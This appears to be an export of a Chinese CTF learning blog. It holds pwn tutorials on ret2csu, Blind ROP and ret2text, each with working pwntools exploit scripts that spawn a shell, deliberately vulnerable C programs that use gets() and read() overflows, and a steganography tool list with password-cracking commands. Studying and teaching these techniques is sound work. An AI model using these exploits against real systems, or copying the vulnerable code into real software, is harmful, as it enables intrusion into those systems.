    <content><![CDATA[<p>前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了</p>
<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道64位的程序，其函数传参时六个参数以内是通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。也就是如果对64位程序进行栈溢出攻击时，我们不是仅仅在栈上布置输入的数据，我们还要找到可以控制以上六个寄存器的<code>gadgets</code>，而正常情况下我们是很难找到六个寄存器各自对应的<code>gadgets</code>。这个时候，就需要用到<code>__libc_csu_init</code>这个函数了。一般情况下的程序在编译时，编译器会自动调用该函数来完成对<code>libc</code>的初始化操作。也就是大多数程序虽然在编写的时候没有用到该函数，但是编译器会自动为其添加该函数，这些程序也因此都会有这个函数。</p>
<p>下面是我编译的程序反汇编后看到的这个函数的内容：(听说这玩意有很多不同版本，会有一些细节上的不一样，不过大同小异)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401190 &lt;__libc_csu_init&gt;:</span><br><span class="line">  401190: 41 57                 push   r15</span><br><span class="line">  401192: 4c 8d 3d df 1f 00 00  lea    r15,[rip+0x1fdf]        # 403178 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  401199: 41 56                 push   r14</span><br><span class="line">  40119b: 49 89 d6              mov    r14,rdx</span><br><span class="line">  40119e: 41 55                 push   r13</span><br><span class="line">  4011a0: 49 89 f5              mov    r13,rsi</span><br><span class="line">  4011a3: 41 54                 push   r12</span><br><span class="line">  4011a5: 41 89 fc              mov    r12d,edi</span><br><span class="line">  4011a8: 55                    push   rbp</span><br><span class="line">  4011a9: 48 8d 2d d0 1f 00 00  lea    rbp,[rip+0x1fd0]        # 403180 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011b0: 53                    push   rbx</span><br><span class="line">  4011b1: 4c 29 fd              sub    rbp,r15</span><br><span class="line">  4011b4: 48 83 ec 08           sub    rsp,0x8</span><br><span class="line">  4011b8: e8 43 fe ff ff        call   401000 &lt;_init&gt;</span><br><span class="line">  4011bd: 48 c1 fd 03           sar    rbp,0x3</span><br><span class="line">  4011c1: 74 1b                 je     4011de &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  4011c3: 31 db                 xor    ebx,ebx</span><br><span class="line">  4011c5: 0f 1f 00              nop    DWORD PTR [rax]</span><br><span class="line">  4011c8: 4c 89 f2              mov    rdx,r14</span><br><span class="line">  4011cb: 4c 89 ee              mov    rsi,r13</span><br><span class="line">  4011ce: 44 89 e7              mov    edi,r12d</span><br><span class="line">  4011d1: 41 ff 14 df           call   QWORD PTR [r15+rbx*8]</span><br><span class="line">  4011d5: 48 83 c3 01           add    rbx,0x1</span><br><span class="line">  4011d9: 48 39 dd              cmp    rbp,rbx</span><br><span class="line">  4011dc: 75 ea                 jne    4011c8 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  4011de: 48 83 c4 08           add    rsp,0x8</span><br><span class="line">  4011e2: 5b                    pop    rbx</span><br><span class="line">  4011e3: 5d                    pop    rbp</span><br><span class="line">  4011e4: 41 5c                 pop    r12</span><br><span class="line">  4011e6: 41 5d                 pop    r13</span><br><span class="line">  4011e8: 41 5e                 pop    r14</span><br><span class="line">  4011ea: 41 5f                 pop    r15</span><br><span class="line">  4011ec: c3                    ret</span><br></pre></td></tr></table></figure>
<p>仔细观察一下就可以发现，我们可以通过<code>0x4011e2</code>处的 <strong>pop链</strong> 和 <code>0x4011c8</code>处的 <strong>mov链</strong> 控制程序执行一个已知地址的函数内容。<br>（ps：之所以控制的是<code>edi</code>而不是<code>rdi</code>寄存器却还能用来给函数传参是因为这里<code>rdi</code>寄存器的高三十二位值为0，可以自己编译一个小程序调试查看）<br>并且因为<strong>程序在执行时其实是cpu在执行程序中对应的机器码，所以最后的pop链其实可以通过控制地址偏移来实现不一样的pop链</strong>。<br>比如说，我们劫持<code>rip</code>后，控制地址为<code>0x4011e5</code>，此时将要执行的内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4011e5: 5c                   pop    rsp</span><br><span class="line">4011e6: 41 5d                pop    r13</span><br><span class="line">4011e8: 41 5e                pop    r14</span><br><span class="line">4011ea: 41 5f                pop    r15</span><br><span class="line">4011ec: c3                   ret</span><br></pre></td></tr></table></figure>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>下面用实例演示对<code>__libc_csu_init</code>中的<code>gadgets</code>的利用:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Intermediate%20ROP/ret2csu/level5">level5</a></p>
<p><strong>将其作为64位程序进行编译，并且开启堆栈不可执行（NX）保护</strong>。<br>（注：另外注意，获取shell用的shellcode一般是调用execve(‘/bin/sh’,0,0)函数，因为system函数会受本地环境变量影响导致不可用。）</p>
<p>该程序在<code>read()</code>时明显存在溢出，但是因为程序非常简单，所以无法找到其他直接控制传参寄存器的<code>gadgets</code>。所以我们覆盖返回地址为<code>__libc_csu_init</code>中的<code>gadgets</code>，然后布置相关参数。<br>这里的攻击思路是，先调用<code>write()</code>泄露<code>got</code>表中已经绑定的函数地址，然后查找到对应libc的版本计算出<code>execve()</code>的地址，然后通过<code>read()</code>将<code>/bin/sh</code>和<code>execve()的地址</code>写到<code>bss</code>段，最后再调用<code>execve()</code>获取shell。</p>
<p>利用脚本如下：</p>
<blockquote>
<p>ps：因为我的本地libc库版本不在LibcSearcher使用的数据库中，<br>所以这里我是先泄露出需要的地址，然后手动查询libc库，从中获<br>取相关数据，所以脚本中会出现计算偏移的步骤中直接用的已知值<br>计算，这些已知值是查询到相关的libc库中对应的基址后写入的）</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入需要用到的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ret = <span class="number">0x4011e2</span></span><br><span class="line">mov_call = <span class="number">0x4011c8</span></span><br><span class="line">execve_offset = <span class="number">0xcb140</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 csu 中的 gadgets的利用payload 写成函数方便每次使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">a1,a2,a3,symbol_call</span>):</span></span><br><span class="line"> payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line"> payload += p64(pop_ret)</span><br><span class="line"> payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(a1) + p64(a2) + p64(a3) + p64(symbol_call)</span><br><span class="line"> payload += p64(mov_call)</span><br><span class="line"> payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line"> payload += p64(main)</span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;泄露 write 地址&quot;</span>)</span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got)</span><br><span class="line">write_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;泄露 read 地址&quot;</span>)</span><br><span class="line">csu(<span class="number">1</span>,read_got,<span class="number">8</span>,write_got)</span><br><span class="line">tmp = p.recv()</span><br><span class="line"><span class="built_in">print</span>(tmp.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;泄露 libc_start_main 地址&quot;</span>)</span><br><span class="line">csu(<span class="number">1</span>,libc_start_main_got,<span class="number">8</span>,write_got)</span><br><span class="line">libc_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc偏移量</span></span><br><span class="line">libcbase = libc_addr - <span class="number">0x026d20</span></span><br><span class="line">system_addr = <span class="number">0x048870</span> + libcbase</span><br><span class="line">bin_sh = <span class="number">0x1881ac</span> + libcbase</span><br><span class="line">execve_addr = execve_offset + libcbase</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,bss_addr,<span class="number">16</span>,read_got)</span><br><span class="line">p.send( <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(execve_addr))</span><br><span class="line"></span><br><span class="line">csu(bss_addr,<span class="number">0</span>,<span class="number">0</span>,bss_addr+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Blind-ROP-盲打pwn"><a href="#Blind-ROP-盲打pwn" class="headerlink" title="Blind ROP(盲打pwn)"></a>Blind ROP(盲打pwn)</h2><p>去实战刷题发现，这东西姿势太多，真的顶不住啊，还是先把例题手撸一遍叭emmm</p>
<blockquote>
<p>u1s1，我为啥会觉得后面的高级ROP里面的<code>SROP</code>挺简单的放在这里这个位置其实就挺好，这玩意和接下来的<code>dl_runtime_resolve</code>一起放高级pwn，单纯的pwn小白个人感觉，如果有大佬在小白blog里无聊翻到这里请一笑略过</p>
</blockquote>
<p>这里就不像<code>ctf-wiki</code>那样讲的写的那么细了，就用小白入门的方式做个记录。</p>
<h3 id="Blind-Pwn-原理"><a href="#Blind-Pwn-原理" class="headerlink" title="Blind Pwn 原理"></a>Blind Pwn 原理</h3><h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><p>一个字————猜！！！。什么花里胡哨的paper，其实中心思想就是 <strong>盲猜</strong> 23333.<br><del>鄙人汐小鹰赌你的程序有！漏！洞！</del></p>
<p>当然，不能瞎吉儿猜，要有理有据的猜才行，毕竟有漏洞无伤大雅，谁写的程序还能没点毛病，关键是这个洞要能被攻击者测试出来，并且利用它实现特殊目的，它才能算是个有用的洞对不对。</p>
<h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul>
<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
</ul>
<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><ul>
<li>测试栈溢出长度，以及是否存在格式化字符串漏洞</li>
<li>枚举一个可用的返回地址，该地址可用的判断条件是只要程序运行到这个地址，一定会出现什么特征，并能让攻击者知晓</li>
<li>枚举一个<code>gadget</code>，一般是<code>libc_csu_init</code>的结尾那个<code>gadget</code></li>
</ul>
<h2 id="上篇-汐白学Pwn-3-1-ROP-Basic"><a href="#上篇-汐白学Pwn-3-1-ROP-Basic" class="headerlink" title="上篇-汐白学Pwn-3.1(ROP-Basic)/)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP">上篇-汐白学Pwn-3.1(ROP-Basic)</a>/)</h2><h2 id="下篇-未完待续"><a href="#下篇-未完待续" class="headerlink" title="下篇-未完待续"></a>下篇-未完待续</h2>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>萌新随笔</title>
    <url>/2019/04/21/%E8%90%8C%E6%96%B0%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<p>目前对个别涉及堆栈的函数的认识：<br>  创建一个辅助堆栈让程序可以使用：<code>HeapCreate（地址，不清楚意思，不清楚意思）</code><br>  设置堆栈（不可改）：<code>HeapAlloc（堆栈名，不清楚意思，堆栈内字节数）</code><br>   返回值<br>   如果成功分配内存，返回值为一个指向所分配内存块的首地址的（void<em>）指针。<br>   如果分配内存失败，并且没有指定HEAP_GENERATE_EXCEPTIONS，则返回NULL。<br>   如果指定了HEAP_GENERATE_EXCEPTIONS，则抛出异常，而不返回NULL<br>  做题时遇见的在堆栈里放东西用的<code>memcpy_s（目标地址，字节数，源地址，复制的字节数）</code><br>Example：<br>       hHeap = HeapCreate(0x40000u, 0,0);   // 创建堆栈<br>       lpMem = (CHAR </em>)HeapAlloc(hHeap, 8u, MaxCount + 1);// 为堆栈赋予空间大小<br>       memcpy_s(lpMem, MaxCount, &amp;unk_409B10, MaxCount);// 在堆栈里放入数据<br>IsDebuggerPresent()<br>  该函数可以检查程序是否正在被调试，返回值为程序内BeingDebugged的值<br>MessageBox 函数用于创建、显示并操作一个消息对话框.<br>  <code>MessageBox（窗口所有者，显示内容，标题字符串，按钮的相关设置）</code></p>
]]></content>
  </entry>
  <entry>
    <title>隐写术</title>
    <url>/2019/06/12/%E9%9A%90%E5%86%99%E6%9C%AF-%E6%9C%89%E7%94%A8%E5%B7%A5%E5%85%B7%E5%92%8C%E8%B5%84%E6%BA%90%E7%9A%84%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<p>隐写术将文件或消息隐藏在另一个文件中，有许多有趣的隐写CTF挑战，其中标志隐藏在图像，音频文件甚至其他类型的文件中。这是我使用的大多数工具和一些其他有用资源的列表<br>最后更新：29.1.2020</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="Stegosaurus-剑龙"><a href="#Stegosaurus-剑龙" class="headerlink" title="Stegosaurus/剑龙"></a>Stegosaurus/剑龙</h3><p>Stegosaurus可以利用py、pyc文件进行隐写</p>
<h3 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h3><p>Steghide是一个隐藏数据的程序，可以隐藏各种图像和音频文件中的数据，只支持这些文件格式：JPEG, BMP, WAV and AU。但它对从其他文件中提取嵌入和加密数据也很有用。它可以安装<code>apt</code>并且<a href="https://github.com/StefanoDeVuono/steghide">源</a>可以在github上找到。</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">steghide info file :显示有关文件是否包含嵌入数据的信息。</span><br><span class="line">steghide extract -sf file :从文件中提取嵌入数据</span><br></pre></td></tr></table></figure>
<h3 id="MP3stego"><a href="#MP3stego" class="headerlink" title="MP3stego"></a>MP3stego</h3><p>mp3音频隐写工具。</p>
<h3 id="SilentEye"><a href="#SilentEye" class="headerlink" title="SilentEye"></a>SilentEye</h3><p>类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。</p>
<h3 id="Foremost"><a href="#Foremost" class="headerlink" title="Foremost"></a>Foremost</h3><p>Foremost是一个程序，它根据页眉，页脚和内部数据结构恢复文件，我发现它在处理png图像时很有用。<br>它可以安装<code>apt</code>并且<a href="https://github.com/korczis/foremost">源</a>可以在github上找到。</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">foremost -i file ：从给定文件中提取数据。</span><br></pre></td></tr></table></figure>
<h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h3><p>有时在图像本身中隐藏着一条消息或文本，为了查看它，您需要应用一些颜色过滤器或使用颜色级别。您可以使用GIMP或Photoshop或任何其他图像编辑软件，但stegsolve使它更容易。它是一个小型的java工具，可以在图像上应用许多颜色过滤器。我个人认为它非常有用。你可以从<a href="https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve">github</a>得到它</p>
<h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>Strings是一个linux工具，可以在文件中显示可打印的字符串。在解决隐秘挑战时，这个简单的工具非常有用。通常，嵌入数据受密码保护或加密，有时密码是文件本身的密码，可以通过使用字符串轻松查看<br>这是一个默认的linux工具，所以你不需要安装任何东西。</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">strings file ：在给定文件中显示可打印的字符串。</span><br></pre></td></tr></table></figure>
<h3 id="Exiftool"><a href="#Exiftool" class="headerlink" title="Exiftool"></a>Exiftool</h3><p>有时重要的东西隐藏在图像或文件的元数据中，exiftool可以非常有助于查看文件的元数据。<br>你可以从<a href="https://www.sno.phy.queensu.ca/~phil/exiftool/">这里</a>得到它</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exiftool file ：显示给定文件的元数据</span><br></pre></td></tr></table></figure>
<h3 id="Exiv2"><a href="#Exiv2" class="headerlink" title="Exiv2"></a>Exiv2</h3><p>一种类似于exiftool的工具。<br>它可以安装，<code>apt</code>并且<a href="https://github.com/Exiv2/exiv2">exiv2</a>可以在github上找到。<br><a href="http://www.exiv2.org/">官方网站</a></p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exiv2 file ：显示给定文件的元数据</span><br></pre></td></tr></table></figure>
<h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><p>Binwalk是一种用于搜索嵌入式文件和数据的图像和音频文件等二进制文件的工具。<br>它可以安装，<code>apt</code>并且<a href="https://github.com/ReFirmLabs/binwalk">源</a>可以在github上找到。</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">binwalk file ：显示给定文件中的嵌入数据</span><br><span class="line">binwalk -e file ：显示和提取给定文件中的数据</span><br></pre></td></tr></table></figure>
<h3 id="Zsteg"><a href="#Zsteg" class="headerlink" title="Zsteg"></a>Zsteg</h3><p>zsteg是一个可以检测png和bmp文件中隐藏数据的工具。<br>安装它：gem install zsteg，源可以在<a href="https://github.com/zed-0xff/zsteg">github</a>上找到</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">zsteg -a file ：运行给定文件上的所有方法</span><br><span class="line">zsteg -E file ：从给定的有效负载中提取数据（例如：zsteg -E b4，bgr，msb，xy name.png）</span><br></pre></td></tr></table></figure>
<h3 id="Wavsteg"><a href="#Wavsteg" class="headerlink" title="Wavsteg"></a>Wavsteg</h3><p>WavSteg是一个python3工具，可以隐藏wav文件中的数据和文件，也可以从wav文件中提取数据。<br>你可以从<a href="https://github.com/ragibson/Steganography#WavSteg">github</a>得到它</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python3 WavSteg.py -r -s soundfile -o outputfile ：从wav声音文件中提取数据并将数据输出到新文件中</span><br></pre></td></tr></table></figure>
<h3 id="Sonic-visualizer"><a href="#Sonic-visualizer" class="headerlink" title="Sonic visualizer"></a>Sonic visualizer</h3><p>Sonic visualizer声波可视化工具是一种用于查看和分析音频文件内容的工具，但在处理音频隐写时它会很有用。您可以在音频文件中显示隐藏的形状。<br><a href="https://www.sonicvisualiser.org/">官方网站</a></p>
<h3 id="Bruteforcers"><a href="#Bruteforcers" class="headerlink" title="Bruteforcers"></a>Bruteforcers</h3><p>BruteForcer是一款暴力破解RAR文件密码的服务器端和客户端多线程工具，用户可以通过多个客户端连接到服务器并行加速<br>详情：<a href="https://www.freebuf.com/sectool/122481.html">https://www.freebuf.com/sectool/122481.html</a></p>
<h3 id="StegCracker"><a href="#StegCracker" class="headerlink" title="StegCracker"></a><a href="https://github.com/Paradoxis/StegCracker">StegCracker</a></h3><p>使用steghide强制密码的工具</p>
<h3 id="Fcrackzip"><a href="#Fcrackzip" class="headerlink" title="Fcrackzip"></a>Fcrackzip</h3><p>有时提取的数据是受密码保护的zip，此工具强制执行zip存档。<br>它可以安装，<code>apt</code>并且<a href="https://github.com/hyc/fcrackzip">源</a>可以在github上找到。</p>
<p>有用的命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fcrackzip -u -D -p wordlist.txt file.zip ：使用给定wordlist中的密码强制给定zip文件</span><br></pre></td></tr></table></figure>
<h2 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h2><h3 id="quipqiup"><a href="#quipqiup" class="headerlink" title="quipqiup"></a><a href="https://www.quipqiup.com/">quipqiup</a></h3><p>自动解密大部分古典密码，不过根据密码强度可能会出现错误</p>
<h3 id="各种版本条码-二维码解码"><a href="#各种版本条码-二维码解码" class="headerlink" title="各种版本条码/二维码解码"></a><a href="https://www.sojson.com/qr/zxing.html">各种版本条码/二维码解码</a></h3><h3 id="snow隐写"><a href="#snow隐写" class="headerlink" title="snow隐写"></a><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">snow隐写</a></h3><h3 id="零宽字符隐写"><a href="#零宽字符隐写" class="headerlink" title="零宽字符隐写"></a>零宽字符隐写</h3><h4 id="zero-width-lib"><a href="#zero-width-lib" class="headerlink" title="zero-width-lib"></a><a href="https://yuanfux.github.io/zero-width-web/">zero-width-lib</a></h4><h4 id="一种零宽字符隐写"><a href="#一种零宽字符隐写" class="headerlink" title="一种零宽字符隐写"></a><a href="http://330k.github.io/misc_tools/unicode_steganography.html">一种零宽字符隐写</a></h4><h3 id="Unicode文本隐写术"><a href="#Unicode文本隐写术" class="headerlink" title="Unicode文本隐写术"></a><a href="https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder">Unicode文本隐写术</a></h3><p>一个用于unicode隐写术的网络工具，它可以编码和解码文本</p>
<h3 id="npiet在线"><a href="#npiet在线" class="headerlink" title="npiet在线"></a><a href="https://www.bertnase.de/npiet/npiet-execute.php">npiet在线</a></h3><p>piet的在线翻译。piet是一种深奥的语言，piet中的程序是图像。阅读更多关于piet的<a href="http://www.dangermouse.net/esoteric/piet.html">信息</a></p>
<h3 id="dcode-fr"><a href="#dcode-fr" class="headerlink" title="dcode.fr"></a><a href="https://www.dcode.fr/">dcode.fr</a></h3><p>有时在解决隐写术挑战时，您需要解码一些文本。dcode.fr有很多解码器，可以提供很多密码，非常有用。</p>
<h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><p>一些隐写挑战平台<br><a href="https://www.hackthebox.eu/">Hack The Box</a><br><a href="https://www.root-me.org/">root me</a><br><a href="https://ringzer0ctf.com/challenges">RingerZeroCTF</a></p>
<p>转载自：<a href="https://0xrick.github.io/lists/stego/">https://0xrick.github.io/lists/stego/</a></p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>汐白学Pwn-3.1(ROP-Basic)</title>
    <url>/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/</url>
    <content><![CDATA[<h2 id="ROP介绍"><a href="#ROP介绍" class="headerlink" title="ROP介绍"></a>ROP介绍</h2><p>因为各种保护的出现，直接向栈或者堆上直接注入代码的方式难以发挥效果。所以需要相应的方法来绕过保护，而目前主要的是<code>ROP(Return Oriented Programming)</code>，其主要方法是在栈缓冲区溢出的基础上，利用程序中已有的小片段<code>(gadgets)</code>来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓<code>gadgets</code>就是以<code>ret</code>结尾的指令序列，通过这些指令序列，可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为<code>ROP</code>，是因为核心在于利用了指令集中的<code>ret</code>指令，改变了指令流的执行顺序。<code>ROP</code>攻击一般得满足如下条件:</p>
<ul>
<li><p>程序存在溢出，并且可以控制返回地址。</p>
</li>
<li><p>可以找到满足条件的<code>gadgets</code>以及相应<code>gadgets</code>的地址。</p>
</li>
</ul>
<p>如果<code>gadgets</code>每次的地址是不固定的，就需要想办法动态获取对应的地址。</p>
<p>这里我是看 <strong>ctf-wiki</strong> 进行入门学习的，所以写的内容是根据 <strong>ctf-wiki</strong> 中pwn的文章进行的梳理。<br>推荐直接去：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/">ctf-wiki</a></p>
<h2 id="basic-ROP"><a href="#basic-ROP" class="headerlink" title="basic ROP"></a>basic ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>最基础的ROP利用。<strong>ret</strong> 即指汇编的<code>ret</code>命令，<strong>text</strong> 指程序的代码段。<br>也就是通过溢出构造ROP链去 <strong>执行程序本身已经存在的代码</strong> 来实现自身想要实现的效果。</p>
<p>简单写一个入门样例程序，编译时保护全关。代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf;</span><br><span class="line">  gets(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2text/ret2text">ret2text</a><br>这个程序使用了gets危险函数，存在溢出点。使用ida查看伪c代码可以直接看到<code>buf</code>到栈底的距离只有 4byte 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;buf, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要输入超过 4byte 的数据就可以覆盖到栈底的值和返回地址，而且这个程序已经预先写好了<code>system(&quot;/bin/sh&quot;)</code>在<code>hacker</code>函数里。<br>只要将返回地址覆盖为<code>hacker</code>的地址执行即可。这里再覆盖数据的时候注意：<strong>32bit和64bit的程序的栈指针宽度不同前者为32位4byte，后者8byte，所以数据覆盖到栈底是要注意</strong>到这个问题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">4</span>+<span class="number">8</span>)      <span class="comment"># 4 是覆盖 到 栈底需要的长度，8 是 覆盖 栈底 需要的长度，64bit系统栈指针宽为 8 byte ，该程序是64位</span></span><br><span class="line">payload += p64(<span class="number">0x401132</span>) <span class="comment"># pwntools 的 p32/64 前文有写过，处理数据挺方便的</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
